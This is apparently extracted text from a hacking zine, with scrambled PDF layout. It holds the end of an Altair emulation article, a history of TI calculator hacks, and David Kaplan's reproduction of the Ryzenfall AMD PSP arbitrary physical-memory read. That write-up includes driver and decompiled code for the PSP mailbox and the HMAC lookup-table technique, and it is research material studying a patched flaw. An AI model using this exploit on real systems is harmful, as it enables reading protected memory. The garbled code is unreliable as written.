I was playing a game written for an imaginary
computer, which was being emulated by CP/M with
64K of contiguous virtual memory on a virtual 2
MHz 8080 CPU loading data from a 330K eight-inch
virtual floppy, itself emulated by a 1MHz 6502 Ap-
ple IIe with 128K of bank-switched memory, loading
data from a DSK file held on an SD card pretending
to be a spinning hard drive. Did I miss anything?
Oh yes. All of this was running inside the emu-
lator Virtual ][ on my Mac.
You see, aside from my earliest versions of Sim-
8800, the whole development process was done on
my Mac, the part of the Apple II played by Virtual
][, a most excellent emulator by Gerard Putter.
My workflow begins in BareBones’ BBEdit,
where I write the assembly code. This is assembled
into a binary by Merlin32 by Brutal Deluxe. Mer-
lin32 is a modern command line rewrite of Merlin,
an assembler that ran on Apple systems. The bi-
nary, and other files like CPM.DSK, are compiled into
a 2MG disk image by CiderPress, which only runs
on Windows, or WINE, in my case.
The 2MG is loaded into an emulated CFFA-3000
in Virtual ][. Yes, it emulates the card emulating a
hard drive. This way, disk access is even faster than
simply emulating the hard drive, as Virtual ][ strives
for accuracy in all things, even disk access latency.
Which brings me to a note about speed - you
may have asked yourself somewhere while reading
this missive, “just how fast can a 1MHz CPU emu-
late a 2MHz one?” The answer is slowly, unusably
slowly. The only way any of the Altair software is
even remotely tolerable, from 4K BASIC all the way
up to Zork, is through the speed boost of emulation
in Virtual ][. In emulation, I can choose to be cycle
accurate, pinning the emulate 6502 at a precise 1.023
MHz, or I can press a button and run the emulation
as fast as my 2.3GHz i7 can handle.
Early on, I ran a benchmark to see just how
slowly the Sim-8800 emulation really ran. I knew it
took sometimes several hundred 6502 cycles to emu-
late a single 8080 cycle, drastically more if I was up-
dating the graphics display at the same time. A sim-
ple prime number finding BASIC program, which on
a real Altair should take 80 seconds or so, instead
took 3 hours, 25 minutes without acceleration.
But can we go deeper?
Probably, but you might get eaten by a grue.
2420:05
An Arbitrary Read Exploit for Ryzenfall
by David Kaplan
Luckily the CTS Labs folks didn’t take this com-
ment at face value and tried it out themselves. The
found that it was possible to provide a non-SMM re-
gion buffer, giving us some sweet sweet primitives!
I like to start my PoC work with a list of tasks
that I’ll need to bring the PoC to successful fruition,
then cross them off one-by-one. Often I change this
list as the PoC implementation challenges my initial
assumptions, but that’s totally okay. For our work
here, the list is something like the following:
In March 2018, the friendly neighbours from
CTS Labs, a little known company, dropped an an-
nouncement about some serious vulnerabilities in
modern Ryzen-based AMD platforms, having given
AMD prior notice only 24 hours before. Debates on
the ethics of this disclosure aside, the technical cat
is out of the bag. What better way to celebrate an
arbitrary physical memory read vulnerability than
by trying to reproduce CTS’ findings on my Ryzen
machine, and then documenting a PoC showing how
to go about doing it yourself?
The Platform Security Processor on AMD plat-
forms is responsible for, well, security stuff. It comes
with some nifty features - like the aforementioned ar-
bitrary read of physical memory, and arbitrary write
for the enterprising reverse-engineer. It’s totally
not the main x86_64 processor and therefore there
needs to be a way for the main processor, which runs
your eDonkey server, to communicate with the PSP,
which does your security stuff. A mailbox protocol
is used for this chit-chat.
The vulnerability itself is straightforward. The
PSP is powerful and has the ability to act on ar-
bitrary physical memory. As such, privileged op-
erations which result in arbitrary primitives should
be gated to domains of trust that could act on this
memory in any event; namely, SMM.
The PSP should validate that the physical ad-
dress of the C2P mailbox CommandBuffer is situated
in the SMM memory region, thereby disallowing the
construction of the buffer in memory accessible by
non-SMM CPL=0. In fact, a comment in five year
old Coreboot source code from AMD 13 seems to in-
dicate that this was the intention. 14
/∗
∗ N o t i f y t h e PSP
∗ completing the
∗ receiving this
∗ honor commands
∗ space .
∗/
• Find the implementation details of the mail-
box protocol for communicating with the PSP.
• Find the location of the mailbox in memory.
• Discover useful commands that could be ex-
ploited for some interesting gain.
• Exploit!
Finding the Mailbox Protocol
For my research here, I used the unpatched
firmware for my GA-AX370-Gaming 5 mother-
board. Cracking open AX370G5.F22 in UEFITool
yields a plethora of DXE modules that may contain
the necessary goodies. I’d encourage the enterpris-
ing hacker here to reverse a whole bunch of these as
they contain much goodness.
Please note that the firmware contains both V1
and V2 versions of certain modules. On this particu-
lar platform, we’re only interested in the V2 version,
as the V2 C2P mailbox protocol that we’re using is
ever-so-slightly different from the V1 version. Take
my word for it - I lost twenty hours of my life so
that you don’t have to!
Digging through a few of the DXE modules that
communicate over C2P will give you the protocol.
AmdPspSmmV2, AmdPspDxeV2, and AmdPspP2CmboxV2
are good places to start.
t h a t t h e sy stem i s
b o o t p r o c e s s . Upon
command , t h e PSP w i l l o n l y
where t h e b u f f e r i s i n SMM
13 src/soc/amd/common/block/psp/psp.c
14 git
clone https://github.com/coreboot/coreboot
25Here’s some neatened Hex-Rays spew:
a DXE module communicates with the PSP via the
mailbox, it’d need to know the location of the PSP
bar mapping. So off we go back to our trusty IDA
to find more wonderful discoveries.
There seem to be two methods for discovering
the base address.
The AmdPspSmmV2 module initializes the PSP bar
if it has not already initialized by another module by
allocating an MMIO region and writing it to some
storage, as shown in get_psp_base_with_init()
on page 28.
Of interest in get_psp_base_with_init() is the
qword_6D60 global. I haven’t yet discovered exactly
what this is, but an address of some sort is written
to offset 0xB8 and the value being held by whatever
storage (PCI bar? Possibly in the PSP itself?) ap-
pears at offset 0xBC. Writing to offset 0xBC has the
effect of storing whatever value under that address.
So, in this instance, the low and high words of
psp_base_address are stored at 0x13B102E0 and
0x13B102E0 respectively.
The location pointed to by qword_6D60 seems to
be hard coded and is perfectly accessible from the
host OS. (If anyone knows exactly what this region
is, please let me know as I’m too lazy to investigate
further.)
m a i l b o x _ a d d r e s s = psp_base_address+0x10570 ;
i f ( get_psp_mailbox_status_recovery ( ) ==1) {
return 0 ;
}
do {
while ( ! _ b i t t e s t ( mailbox_address , 0x1Fu ) ) ;
} while ( ∗ m a i l b o x _ a d d r e s s & 0 xFF0000 ) ;
∗ ( mailbox_address + 4) = b u f f e r ;
∗ m a i l b o x _ a d d r e s s = cmd << 1 6 ;
while ( ∗ m a i l b o x _ a d d r e s s & 0 xFF0000 ) ;
Reading this code, we can learn quite a bit.
• The start of the mailbox is at offset 0x10570
from the psp_base_address.
• Before writing to the mailbox registers, one
needs to wait for the interface to go ready (by
testing the most significant bit at the start of
this region) and making sure that the com-
mand byte is cleared
• The buffer at offset 0x4 points to the com-
mand buffer which holds parameters for the
command (more on this later)
• To transact, the command is written to the
third byte of the mailbox.
MEMORY[ 0 xF80000B8 ] = 0 x13B102E0 ;
psp_base_address =
MEMORY[ 0 xF80000BC ] & 0xFFF00000 ;
• The PSP is done when the cmd byte is cleared.
The mailbox registers can be represented by the
following structure which will need to be populated
and polled accordingly.
The second method for locating the psp_base_-
address is via the 0xc00110a2 MSR. Coreboot uses
this for locating the address, and so does my PoC.
AmdPspDxeV2 seems to be responsible for writing
this MSR, with the value pulled out by the first
method:
typedef struct _PSP_CMD {
2
v o l a t i l e BYTE S e c o n d a r y S t a t u s ;
BYTE Unknown ;
4
v o l a t i l e BYTE Command ;
v o l a t i l e BYTE S t a t u s ;
6
ULONG_PTR CommandBuffer ;
} PSP_CMD, ∗PPSP_CMD;
It is important to note that the psp_base_-
address and buffers are physical addresses. To
write to these locations from a Windows driver, we
need to map the IO space accordingly to system
virtual addresses. Performing the necessary map-
pings together with the control flow logic gives us
the _callPsp function on page 27.
So we now know enough of the mailbox protocol
to implement it, but where in memory do we target
the write? The PSP bar will be mapped somewhere
in physical address space. It seems obvious that if
1 MEMORY[ 0 xF80000B8 ] = 0 x13B102E0 ;
psp_base_address = 0 i 6 4 ;
3 i f ( MEMORY[ 0 xF80000BC ] & 0xFFF00000 )
psp_base_address =
5
MEMORY[ 0 xF80000BC ] & 0xFFF00000 ;
__writemsr ( 0 xC00110A2 , psp_base_address ) ;
To recap: at this point we know how to commu-
nicate with the PSP and we know where in physical
memory to transact with the mailbox. We now need
to discover something useful to do with this inter-
face.
26NTSTATUS _ c a l l P s p ( _In_ ULONG Command ,
NTSTATUS s t a t u s ;
PHYSICAL_ADDRESS commandPa ;
PPSP_CMD commandVa = NULL ;
PHYSICAL_ADDRESS commandBufferPa ;
PPSP_CMD_BUFFER commandBufferVa ;
NT_ASSERT( D a t a B u f f e r
_In_ ULONG DataLength ,
_Inout_ BYTE ∗ D a t a B u f f e r ) {
!= NULL) ;
// O b t a i n t h e PSP m a i l b o x a d d r e s s .
s t a t u s = _ g e t P s p M a i l b o x A d d r e s s (&commandPa ) ;
i f ( ! NT_SUCCESS( s t a t u s ) ) {
T r a c e E v e n t s (TRACE_LEVEL_ERROR, TRACE_DRIVER,
" %!FUNC ! : P s p M a i l b o x A d d r e s s r e t r i e v a l
goto end ;
}
failed .
( % !STATUS ! ) " ,
status ) ;
// Map t h e m a i l b o x IO s p a c e i n t o s y s t e m v i r t u a l a d d r e s s s p a c e .
commandVa = (PPSP_CMD) MmMapIoSpace ( commandPa , s i z e o f (PSP_CMD) , MmNonCached ) ;
i f (NULL == commandVa ) {
s t a t u s = STATUS_INSUFFICIENT_RESOURCES ;
T r a c e E v e n t s (TRACE_LEVEL_ERROR, TRACE_DRIVER,
" %!FUNC ! : P s p M a i l b o x A d d r e s s r e t r i e v a l f a i l e d . ( % !STATUS ! ) " , s t a t u s ) ;
goto end ;
}
// Ensure t h a t t h e PSP i s r e a d y t o r e c e i v e commands .
// TODO: t e s t f o r HALT? _ b i t t e s t ( commandVa , 3 0 )
s t a t u s = _waitOnPspReady ( ( PVOID)&commandVa− >S t a t u s ) ;
i f ( ! PSP_SUCCESS( s t a t u s ) ) goto end ;
s t a t u s = _waitOnPspCommandDone ( ( PVOID)&commandVa− >Command ) ;
i f ( ! PSP_SUCCESS( s t a t u s ) ) goto end ;
// C o n s t r u c t t h e command and c o p y i n t h e command b u f f e r . The c a l l e r t o t h i s
// f u n c t i o n s u p p l i e s s t o r a g e f o r t h e command b u f f e r . T h i s s t o r a g e must b e
// s i z e o f (PSP_CMD_BUFFER) − s i z e o f (BYTE∗ ) g r e a t e r t h a n t h e c o n t e n t s o f t h e
// b u f f e r t o a l l o w f o r a d d i t i o n o f t h e h e a d e r .
//
// NOTE: The o r d e r i n g o f t h e f o l l o w i n g c o d e i s ∗ v e r y ∗ i m p o r t a n t .
//
Note , a l s o , t h e u s e o f RtlMoveMemory t o h a n d l e t h e o v e r l a p p i n g
//
s o u r c e and d e s t i n a t i o n b u f f e r s .
commandBufferVa = (PPSP_CMD_BUFFER) D a t a B u f f e r ;
commandBufferPa = M m G e t P h y s i c a l A d d r e s s ( commandBufferVa ) ;
commandVa− >CommandBuffer = commandBufferPa . QuadPart ;
RtlMoveMemory ( ( PVOID) commandBufferVa− >Data ,
DataBuffer ,
D at a Le ng t h ) ;
commandBufferVa− >S i z e = PSP_COMMAND_BUFFER_HEADER_SIZE + Da ta L en gt h ;
commandBufferVa− >S t a t u s = 0 ;
// S e t t i n g t h e command b y t e c a l l s i n t o
commandVa− >Command = Command & 0 x f f ;
t h e PSP f o r
processing .
s t a t u s = _waitOnPspCommandDone ( ( PVOID)&commandVa− >Command ) ;
i f ( ! PSP_SUCCESS( s t a t u s ) )
goto end ;
//
if
P r o c e s s i n g i s done . Check f o r i n t e r f a c e e r r o r .
( _ h a s P s p E r r o r ( (PULONG)&commandVa− >S t a t u s ) ) {
s t a t u s = commandVa− >S t a t u s ;
// Hack .
T r a c e E v e n t s (TRACE_LEVEL_ERROR, TRACE_DRIVER,
" %!FUNC ! : PSP I n t e r f a c e e r r o r . ( % !STATUS ! ) " ,
goto end ;
status ) ;
}
// Check f o r command e r r o r .
i f ( 0 != commandBufferVa− >S t a t u s ) {
s t a t u s = commandBufferVa− >S t a t u s ;
// Hack .
T r a c e E v e n t s (TRACE_LEVEL_ERROR, TRACE_DRIVER,
" %!FUNC ! : PSP Command e r r o r . ( % !STATUS ! ) " ,
status ) ;
goto end ;
}
// I f c o n t r o l r e a c h e s h e r e , t h e command h a s m i r a c u l o u s l y s u c c e e d e d .
// Now s t r i p t h e command b u f f e r h e a d e r and r e t u r n t o t h e c a l l e r .
RtlMoveMemory ( D a t a B u f f e r , (PVOID) commandBufferVa− >Data , D at a Le ng t h ) ;
s t a t u s = STATUS_SUCCESS ;
end :
if
(NULL != commandVa ) {
MmUnmapIoSpace ( commandVa ,
commandVa = NULL ;
}
return
s i z e o f (PSP_CMD) ) ;
status ;
}
Example for Calling the PSP
272
4
6
8
10
12
char get_psp_base_with_init ( ) {
unsigned __int64 v0 ;
//
unsigned __int64 r e t ;
//
unsigned __int16 v2 ;
//
signed __int64 r e s ;
//
__int64 psp_base_address ;
//
signed __int64 v5 ;
//
__int64 v6 ;
//
__int64 qword_6D60_ ;
//
__int16 v9 ;
//
i n t psp_base_address__ ;
//
__int64 psp_base_address_ ; //
__int64 v12 ;
//
rax
rax
r8
rax
rbx
rdi
r8
rcx
[ r s p +40h ]
[ r s p +48h ]
[ r s p +50h ]
[ r s p +58h ]
[ r b p+8h ]
[ r b p +10h ]
[ r b p +18h ]
[ r b p +20h ]
14
16
18
20
22
24
26
28
30
32
34
36
38
v0 = __readmsr ( 0 x1Bu ) ;
r e t = ( ( ( unsigned __int64 )HIDWORD( v0 ) << 3 2 ) | ( unsigned i n t ) v0 ) >> 8 ;
if ( ret & 1 ) {
LOBYTE( r e t ) = get_psp_base ( ( unsigned i n t ∗ )&psp_base_address__ ) ;
i f ( ! (_BYTE) r e t ) {
psp_base_address_ = 0 i 6 4 ;
v2 = ( unsigned __int8 ) v9 | 0 x8000 ;
v12 = 0 x 1 0 0 0 0 0 i 6 4 ;
LOBYTE( v9 ) = v9 & 0 x38 | 3 ;
r e s = psp_allocate_mmio(&psp_base_address_ , ( unsigned __int64 ∗ )&v12 , v2 , &v9 ) ;
psp_base_address = psp_base_address_ ;
v5 = r e s ;
i f ( r e s && ( sub_16D8 ( 0 x20300593u ) , v5 < 0 ) )
l o g ( 0 x 8 0 0 0 0 0 0 0 i 6 4 , a P s p b a r i n i t e a r l , v6 ) ;
else
l o g ( 0 x 8 0 0 0 0 0 0 0 i 6 4 , a P s p b a r i n i t e a r l _ 0 , psp_base_address ) ;
qword_6D60_ = qword_6D60 ;
∗ (_DWORD ∗ ) ( qword_6D60 + 0xB8 ) = 0 x13B102E0 ;
∗ (_DWORD ∗ ) ( qword_6D60_ + 0xBC) = psp_base_address | 0 x101 ;
LOBYTE( r e t ) = 0xE4u ;
∗ (_DWORD ∗ ) ( qword_6D60_ + 0xB8 ) = 0 x13B102E4 ;
∗ (_DWORD ∗ ) ( qword_6D60_ + 0xBC) = HIDWORD( psp_base_address ) ;
}
}
return r e t ;
40 }
get_psp_base_with_init()
28Arbitrary Read
The method I’m going to describe for arbitrary
physical memory read is the same that the CTS
Labs folks used in their BlueHatIL ’19 presentation.
There are many interesting C2P commands to dis-
cover and some can be abused in all sorts of inter-
esting ways.
The command we’re interested in is found in
AmdMemS3CzDxe. The lazy engineer that I am, I only
partially reverse engineered this module to be able
to implement the arbitrary read. Therefore, I made
some assumptions that might differ from the facts.
It seems to me that when the machine enters S3,
certain values are read from the PCD interface. A
structure built to hold this data is sent to the PSP
via a mailbox transaction. 15 The PSP will calculate
and return an HMAC on this data using some in-
ternal secret key. The now-integrity-protected data
structure will presumably then be saved somewhere
via some SMM module. 16 I assume that on resume-
from-S3 this structure will be retrieved from storage,
verified and written back to where it came from, but
I haven’t dug into that much. It might be an inter-
esting area for further research.
The somewhat dirty decompiled function on
page 30 performs the work. I’ve tried to neaten it
up a little by hand.
We can ignore the whole SMM bit; the only part
that interests us is how the MBOX_BIOS_CMD_S3_-
DATA_INFO mailbox command is built.
If we recall from our discussion of the PSP_CMD
structure, the mailbox command consists of a sin-
gle byte command. In this instance the value 8 for
MBOX_BIOS_CMD_S3_DATA_INFO and a pointer to a
CommandBuffer. 17
From the decompiled logic on page 30, we can
see the format of the command header.
specific case of command 8, the parameters look like
this.
1 typedef struct _PSP_DATA_INFO_BUFFER {
ULONG_PTR P h y s i c a l A d d r e s s ;
3
SIZE_T S i z e ;
BYTE Hmac [HMAC_LEN] ;
5 }PSP_DATA_INFO_BUFFER, ∗PPSP_DATA_INFO_BUFFER
;
We now know how to transact MBOX_BIOS_CMD_-
S3_DATA_INFO with the PSP. How do we abuse this
for arbitrary read?
Well, we have a primitive that takes any physical
address and returns the HMAC of that address. We
can abuse this primitive to construct a table of all
HMAC values for all possible values of a single byte.
(See page 31.)
Having constructed this table, we now have an
arbitrary read primitive from physical memory. To
read any address, we can simply point this same
logic (MBOX_BIOS_CMD_S3_DATA_INFO) at any loca-
tion in physical memory, dumping each byte by first
asking the PSP to calculate an HMAC on the byte
for us and then looking up that byte value in our
HMAC lookup table, as shown on page 31.
AMD fixed this particular vulnerability in
AGESA 1.0.0.4. On my particular Gigabyte plat-
form, any firmware prior to F23 is vulnerable.
An enterprising hacker seeking further research
might look for an arbitrary write primitive, even
though publishing working code for it might be a
bit irresponsible. It might also be worthwhile to test
AMD’s fix - perhaps it’s possible to trigger SMM to
communicate with the PSP, then race the “is com-
mand buffer in SMM” check? (And is such a check
how AMD fixed the issue? Reverse engineering the
PSP could answer this question.)
Before signing off, I’d like to thank @idolion_
and @uri_farkas, who first discovered this vulnera-
bility, for their help with some hints when I initially
got stuck trying to reproduce their work here.
I hope you enjoyed this little dive into the AMD
PSP C2P mailbox. Full PoC code for Windows 10 is
available. 18 Platform firmware is full of all sorts of
goodies and is a great area for discovering powerful
primitives.
1 typedef struct _PSP_CMD_BUFFER {
ULONG S i z e ;
3
v o l a t i l e ULONG S t a t u s ;
v o l a t i l e BYTE Data [ANYSIZE_ARRAY ] ;
5 } PSP_CMD_BUFFER, ∗PPSP_CMD_BUFFER;
While the header is common to all mailbox com-
mands, each one has its own parameters. In the
15 Specifically
command 8, MBOX_BIOS_CMD_S3_DATA_INFO.
is sent over the EFI_SMM_COMMUNICATION_PROTOCOL.
17 This must be a pointer to a physical memory address. Any virtual address used in the PoC must be converted to its physical
address for the PSP as it, naturally, has no concept of x86 virtual memory.
18 git clone https://github.com/depletionmode/ryzenfallen; unzip pocorgtfo20.pdf ryzenfallen.zip
16 It
292
4
6
8
10
12
14
__int64 _ _ f a s t c a l l Hmac_address_range_via_psp_and_save ( __int64 Length , __int64 Ad dress ) {
__int64 l e n g t h ;
// r s i
__int64 a d d r e s s ;
// r b p
__int64 b u f f e r 0 _ p t r ;
// r b x
__int64 p o o l B u f f e r _ ;
// r d i
EFI_BOOT_SERVICES ∗ g _ E f i B o o t S e r v i c e s ;
// r a x
__int64 s t a t u s ;
// r a x
__int64 ( _ _ f a s t c a l l ∗∗ s m m C o m m u n i c a t i o n P r o t o c o l I n t e r f a c e ) (_QWORD, __int64 , __int64 ∗ ) ; // r9
__int64 r e s u l t ;
// r a x
__int64 v10 ;
// r a x
char hmac [ 3 2 ] ;
// [ r s p +30h ] [ rbp−D8h ]
char v12 ;
// [ r s p +50h ] [ rbp−B8h ]
PSP_DATA_INFO_CMD_BUFFER commandBuffer ; // [ r s p +70h ] [ rbp −98h ]
__int64 p o o l B u f f e r ;
// [ r s p +110h ] [ r b p+8h ]
16
l e n g t h = Length ;
a d d r e s s = Address ;
commandBuffer . Header . S i z e = 0 x38 ;
commandBuffer . B u f f e r . P h y s i c a l A d d r e s s = a d d r e s s ;
commandBuffer . B u f f e r . S i z e = l e n g t h ;
b z e r o (&commandBuffer . B u f f e r . Hmac , 3 2 ) ;
do_psp__MBOX_BIOS_CMD_S3_DATA_INFO( ( unsigned __int64 )&commandBuffer & 0
xFFFFFFFFFFFFFFE0ui64 ) ;
i f ( hmac != commandBuffer . B u f f e r . Hmac )
memcpy__( hmac , commandBuffer . B u f f e r . Hmac , 0 x 2 0 u i 6 4 ) ;
: : g _ E f i B o o t S e r v i c e s −>A l l o c a t e P o o l ( 4 i 6 4 , l e n g t h + 3 2 , &p o o l B u f f e r ) ;
: : g _ E f i B o o t S e r v i c e s −>SetMem ( p o o l B u f f e r , l e n g t h + 3 2 , 0 i 6 4 ) ;
: : g _ E f i B o o t S e r v i c e s −>CopyMem( p o o l B u f f e r , a d d r e s s , l e n g t h ) ;
: : g _ E f i B o o t S e r v i c e s −>CopyMem( l e n g t h + p o o l B u f f e r , hmac , 32 i 6 4 ) ;
b u f f e r 0 _ p t r = g_Buffer0 ;
poolBuffer_ = poolBuffer ;
: : g _ E f i B o o t S e r v i c e s −>CopyMem( g_Buffer0 , &g_Guid0 , 16 i 6 4 ) ;
g_EfiBootServices = : : g_EfiBootServices ;
∗ (_QWORD ∗ ) ( b u f f e r 0 _ p t r + 1 6 ) = 0 x 3 0 0 0 i 6 4 ;
g _ E f i B o o t S e r v i c e s −>CopyMem( b u f f e r 0 _ p t r + 0 x18 , p o o l B u f f e r _ ) ;
s t a t u s = : : g _ E f i B o o t S e r v i c e s −>L o c a t e P r o t o c o l ) (
&g_EFI_SMM_COMMUNICATION_PROTOCOL_GUID,
0 i64 ,
&g_SmmCommunicationProtocolInterface ) ;
s m m C o m m u n i c a t i o n P r o t o c o l I n t e r f a c e = g_SmmCommunicationProtocolInterface ;
if ( status < 0 )
smmCommunicationProtocolInterface = 0 i 6 4 ;
g_SmmCommunicationProtocolInterface = s m m C o m m u n i c a t i o n P r o t o c o l I n t e r f a c e ;
i f ( ! smmCommunicationProtocolInterface
| | ( r e s u l t = ( ∗ s m m C o m m u n i c a t i o n P r o t o c o l I n t e r f a c e ) ( smmCommunicationProtocolInterface ,
g_Buffer0 , &qword_16E10 ) )
){
r e s u l t = : : g _ E f i B o o t S e r v i c e s −>F r e e P o o l ) ( p o o l B u f f e r _ ) ;
i f ( r e s u l t >= 0 ) {
v10 = g _ E f i R u n t i m e S e r v i c e s −>S e t V a r i a b l e ) (
aMemorys3savenv ,
&g_VendorGuid ,
3 i64 ,
length ,
address ) ;
r e s u l t = v10 != 0 ? ( unsigned i n t ) v10 : 0 ;
}
}
return r e s u l t ;
18
20
22
24
26
28
30
32
34
36
38
40
42
44
46
48
50
52
54
56
58
}
Finding the HMAC Address Range
301 NTSTATUS _populateHmacLookupTable (BYTE Table [ ] [ HMAC_LEN] ) {
NTSTATUS s t a t u s ;
3
ULONG i d x ;
PHYSICAL_ADDRESS s t o r a g e P a ;
5
NT_ASSERT( Table != NULL) ;
7
/∗ B u i l d t h e HMAC l o o k u p t a b l e needed f o r d e c o d i n g by i n c r e m e n t i n g a b y t e a t a known
9
∗ location ( using the stack address of the loop idx ) , reading i t via the relevant
∗ PSP f u n c t i o n and s t o r i n g t h e r e s u l t a n t HMAC v a l u e .
11
∗/
13 s t o r a g e P a = MmGetPhysicalAddress(& i d x ) ;
15 f o r ( i d x = 0 ; i d x < 0 x100 ; i d x++) {
// Ask t h e PSP t o c a l c u l a t e t h e HMAC
s t a t u s = _readPaByteViaPsp ( s t o r a g e P a , Table [ i d x ] ) ;
i f ( ! PSP_SUCCESS( s t a t u s ) )
goto end ;
}
17
19
21
s t a t u s = STATUS_SUCCESS ;
23 end :
return s t a t u s ;
25 }
Populates a Lookup Table of CMAC Hashes
1 NTSTATUS _decodeByte (_In_ BYTE Hmac [HMAC_LEN] , _Out_ BYTE ∗ Byte ) {
NTSTATUS s t a t u s ;
3
PPSP_DRV_CONTEXT c o n t e x t ;
5
NT_ASSERT(Hmac != NULL) ;
NT_ASSERT( Byte != NULL) ;
7
PAGED_CODE( ) ;
9
c o n t e x t = WdfObjectGetTypedContext ( g_Device , PSP_DRV_CONTEXT) ;
11
// This i s a n a s t y O( n ) l o o k u p . A h a s h t a b l e would be a b e t t e r o p t i o n .
f o r (ULONG i d x = 0 ; i d x < 0 x100 ; i d x++) {
i f (HMAC_LEN == RtlCompareMemory (Hmac ,
c o n t e x t −>HmacLookupTable [ i d x ] ,
HMAC_LEN) ) {
∗ Byte = i d x & 0 x f f ;
s t a t u s = STATUS_SUCCESS ;
13
15
17
19
goto end ;
21
}
}
23
// C o n t r o l r e a c h i n g h e r e means t h a t t h e l o o k u p f a i l e d .
s t a t u s = STATUS_NOT_FOUND;
25
end :
27
return s t a t u s ;
}
Function to Decode Exfiltrated Bytes
3120:06
A Short History of TI Calculator Hacks
by Brandon L. Wilson
A lot of people are probably familiar with Texas
Instruments graphing calculators from school, those
overpriced devices that we were required to buy for
math class. Some people are also familiar with the
fact that these calculators are programmable, that
they can be made to do all sorts of things, such as
taking notes or playing games.
But what people outside of the calculator com-
munity might not know is that these devices are
great learning tools for getting into programming,
and even reverse engineering. A big chunk of what
we know about programming graphing calculators,
we know because we figured it out ourselves. We
wrote code not knowing what would happen, we’d
run tests, experiment with what the hardware would
do, and so on. That’s never more true than with
trying to break the security built into these things.
Why would we want to do that? Well, we’ll get into
that.
I have way too many calculators. They are what
got me started in the software development indus-
try, and because of them, I’m now circling around
the security industry.
There are one or two people who have more in
terms of numbers, but mine is the largest in that it
has at least one of every model ever mass-produced.
I have at least one of every model from all over the
world, every hardware revision, every color variant,
every ViewScreen or teacher’s edition, every EZ-
Spot yellow school version, as well as a number of
one-of-a-kind or near-one-of-a-kind prototypes and
engineering samples.
I grew up with these things, they gave me my ca-
reer and my life. I love them, and I want to make it
so they can do absolutely everything they are capa-
ble of and then some, and make sure that everyone
else can, too, because I’m not the only one. They
have jump started a lot of careers, teaching so many
of us about low level programming, embedded sys-
tems, and hardware and software hacking.
My hope is that I can share with you a little bit
of my journey with these devices, how far they’ve
come, and maybe learn a little something or be en-
tertained along the way.
First and foremost, a graphing calculator is a cal-
culator. It’s capable of doing everything a scientific
calculator can do, but it also has a large screen en-
abling the graphing of equations, tracing solutions
along a graph, drawing, and so on. They even have
a 2.5mm I/O port, or in some cases USB, so that
you can share variables and programs between cal-
culators, or connect it to a computer and share them
with anyone in the world.
They are programmable, which means you can
create programs to help you solve math or engi-
neering problems, using a BASIC-like language TI
invented called TI-BASIC. It does have some very
basic commands for programming games, such as
gathering keypress input, but TI-BASIC is just way
too slow to really utilize the hardware to its maxi-
mum potential.
So for that, we have assembly language. Now,
in one form or another, every model, with the ex-
ception of the TI-80, is capable of running arbitrary
native code. Some of these have this capability built
into them, and some of them had to be hacked first,
by the graphing calculator user community.
Z80 Models
The first models used the Zilog Z80, a classic pro-
cessor used in a number of devices. It’s a 6MHz,
or on some models, 15MHz 8-bit CPU, with 16-
bit addressing, meaning it can access a maximum
of 64KB of memory at once, and it has an 8-bit I/O
port interface, so you can interact with hardware by
outputting or inputting from one of up to 256 logi-
cal ports. They have anywhere from 32KB of RAM
all the way up to 128KB. And some of them, the
most interesting ones, have Flash memory, which
ranges anywhere from 1MB up to 4MB.
32gan by taking a look at other things that are stored
in System RAM.
The TI-OS is essentially just a series of “Con-
texts,” which are kind of like built-in applications,
things such as the home screen, the equation editor,
the graph screen, etc. Each context has a table of
addresses that point to handlers for different things,
such as what happens once you press a key. The key-
press handler is called the cxMain handler, because
it’s the main, most important handler. Whenever
you switch to a new context, these handler addresses
are stored in System RAM. Our goal is to find a way,
at runtime, to overwrite the cxMain handler.
We do this by abusing another feature of these
calculators, which is storing values to variables, such
as Real variables. 19 These numbers are stored in
RAM as nine bytes, and when you copy one variable
to another, these nine bytes are just copied from the
source variable to wherever the data for the second
variable is.
So if we modify one real variable, such as X, with
the bytes we want, like the address of code we embed
in the memory backup, and then modify the loca-
tion of a second real variable, such as Y, to point
to cxMain instead of the variable data’s real loca-
tion, then we can overwrite cxMain by just storing
X to Y. Once you do that, cxMain is overwritten,
and the next time you press a key, our code is run-
ning! That gets us a shell with which to run other
programs, just like on the TI-85.
TI-85, ZShell and the Custom Menu
The first model capable of running native assembly
programs was the TI-85, a very old model you don’t
see these days. Rumor has it that TI employees ac-
tually had a bet as to whether we’d figure out a way
to run native assembly programs. That was a safe
bet, because the community did figure out a way,
and it was through something called ZShell.
To explain how ZShell works, we should begin
by understanding “Backups” that are transferred by
the TI-Graph Link I/O cable, which is what con-
nects these old calculators to a computer. These
backups are just dumps of the entire RAM, not just
where variables are stored, but the system’s RAM
as well.
The calculator’s operating system also supports
something called “Custom” menu entries, which you
access with the Custom button on the keyboard.
You could add your most commonly used OS com-
mands in there and be able to access them easily.
The way the OS stores things in this menu is by
just keeping track of the address of the code that
would handle this OS command. And it keeps track
of this in System RAM, which is included in the
computer backup.
All we have to do for code execution is to change
the address of one of these custom menu entries
to point to code that we also embed in the RAM
backup. That is what ZShell is, just a small pro-
gram that lets you run other programs which are
stored on the calculator in the form of String vari-
ables.
TI-83 Backdoor, TI-86 Support
Then came along the TI-83, except this model ac-
tually has a backdoor in it, put there by Texas In-
struments, which allows directly running assembly
programs stored in RAM. This backdoor is hidden
in the Send( command, which is normally used for
transferring variables from one calculator to another
via the 2.5mm I/O port. But if you put a 9 right
after the command, it won’t transfer the variable,
it’ll instead execute it as native code. The TI-83 is
the first calculator I ever had, so this was around
the time I joined the calculator community.
When TI saw there was a booming interest in
assembly programming through the TI-83 backdoor,
they added really nice assembly support to the TI-
86, which is a new-and-improved TI-85. This cal-
culator has a brand new command, Asm(, intended
for running assembly programs right from the be-
TI-82 and Code Execution through Reals
Then the TI-82 came along, and it also had to be
hacked to allow execution of native assembly code.
It has no Custom menu, so another method had to
be found. It does have memory backups, so we be-
19 They
are Real in the mathematical sense, in that they are not Complex.
33ginning. TI not only provided some basic documen-
tation for how they use System RAM and how User
RAM is laid out, they even included OS hooks so we
could integrate with the OS and expand its function-
ality! It was really quite nice for its time.
One thing that’s unique about this model is that
it has an expansion port on the back, which would
let you add features or even turn it into a different
model entirely. There’s the TI-92 II module and the
TI-92 E module, E for Europe, that essentially just
added more RAM and language options. And then
there’s the TI-92 Plus module, equally as rare but
way more interesting, as it turns it into a TI-92 Plus,
giving it Flash memory and upgradeability. That
model is basically the same as the TI-89, except the
TI-89 doesn’t have a QWERTY keyboard.
And then came the TI-89 Titanium, which has
some minor hardware changes and most noticeably
adds a USB port.
A Dozen Models with Flash
And then came Flash technology. These, to me,
